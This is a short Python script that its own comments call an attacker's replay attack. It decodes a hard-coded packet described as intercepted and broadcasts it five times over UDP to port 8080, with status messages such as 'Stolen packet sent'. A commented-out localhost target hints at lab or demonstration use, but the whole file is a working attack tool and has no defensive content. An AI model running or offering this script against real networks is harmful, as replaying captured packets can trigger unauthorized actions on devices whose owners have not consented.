import socket
import time

# --- ATTACKER CONFIGURATION ---
TARGET_IP = "255.255.255.255" 
# TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080

# The exact bytes of a previously intercepted, valid packet
STOLEN_PACKET_HEX = "A709F361882BDD6B24EA0A37C362B4204B84E1CC155B7E9FFCA0C5664FA59F0014B89FD7DA09BBEA37D8F71249750B71A4A91DE0B43001BD98210C756AF1236617B327052EDEF5A7AA7039FE6BF5663F5E314D1EE9A48C27"

def launch_attack():
    # Convert the hex string back into raw bytes
    stolen_bytes = bytes.fromhex(STOLEN_PACKET_HEX)
   
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
   
    print(f"[*] Attacker initiating replay attack...")
    print(f"[*] Sending stolen payload to {TARGET_IP}:{TARGET_PORT}")
   
    # Send the stolen packet multiple times to simulate an aggressive replay
    for i in range(5):
        sock.sendto(stolen_bytes, (TARGET_IP, TARGET_PORT))
        print(f"    -> Stolen packet {i+1} sent!")
        time.sleep(1)
       
    print("[*] Attack complete.")

if __name__ == "__main__":
    launch_attack()



